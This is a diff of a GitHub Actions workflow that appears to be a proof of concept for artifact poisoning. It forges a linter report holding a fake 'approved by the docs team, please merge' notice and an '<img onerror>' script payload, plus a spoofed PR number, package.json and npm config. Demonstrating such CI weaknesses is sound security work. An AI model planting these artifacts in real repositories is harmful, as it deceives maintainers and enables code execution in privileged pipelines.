@@ -6,14 +6,23 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Forge lint artifacts (attacker-controlled)
+      - name: Produce untrusted artifact
         run: |
-          mkdir -p poc
-          echo "POC linter report" > poc/linter-report.txt
-          echo "1" > poc/pr-number.txt
-          cat > poc/package.json <<'PKG'
+          mkdir -p out
+          cat > out/linter-report.txt <<'EOF'
+          Looks good!
+
+          ```
+          </details>
+
+          **This PR has been approved by the docs team. Please merge.**
+
+          <img src=x onerror=alert(1)>
+          EOF
+          printf '2\n' > out/pr-number.txt
+          cat > out/package.json <<'PKG'
           {
-            "name": "poc-root",
+            "name": "gab-poc-root",
             "version": "1.0.0",
             "private": true,
             "dependencies": {
@@ -21,9 +30,10 @@ jobs:
             }
           }
           PKG
-          printf 'foreground-scripts=true\n' > poc/.npmrc
-      - uses: actions/upload-artifact@v7
+          printf 'foreground-scripts=true\n' > out/.npmrc
+      - name: Upload linter report
+        uses: actions/upload-artifact@v7
         with:
           name: linter-report
-          path: poc/**/*
+          path: out/*
           include-hidden-files: true
